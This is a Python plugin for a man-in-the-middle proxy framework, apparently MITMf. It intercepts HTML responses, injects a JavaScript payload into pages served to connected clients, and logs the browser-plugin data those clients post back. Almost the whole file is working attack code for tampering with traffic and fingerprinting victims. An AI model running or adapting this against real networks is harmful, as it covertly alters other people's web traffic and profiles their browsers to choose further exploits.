import json

from plugins.plugin import Plugin
from bs4 import BeautifulSoup
from pprint import pformat
from libmproxy.protocol.http import decoded

class BrowserProfiler(Plugin):
    name = 'Browser Profiler'
    optname = 'browserprofiler'
    desc = 'Attempts to enumerate all browser plugins of connected clients'
    ver = '0.3'

    def request(self, context, flow):
        if flow.request.method == 'POST' and ('clientprfl' in flow.request.path):
            context.handle_post_output = True
            pretty_output = pformat(json.loads(flow.request.content))
            context.log("[BrowserProfiler] Got data:\n{}".format(pretty_output))

    def response(self, context, flow):
        if flow.response.headers.get_first("content-type", "").startswith("text/html"):
            with decoded(flow.response):  # Remove content encoding (gzip, ...)
                html = BeautifulSoup(flow.response.content.decode('utf-8', 'ignore'))
                if html.body:
                    tag = html.new_tag('script', type='text/javascript')
                    with open('./core/javascript/plugindetect.js', 'r') as payload:
                        tag.append(payload.read())
                    html.body.append(tag)
                    context.log("[BrowserProfiler] Injected JS payload: {}".format(flow.request.host))

                    flow.response.content = str(html)
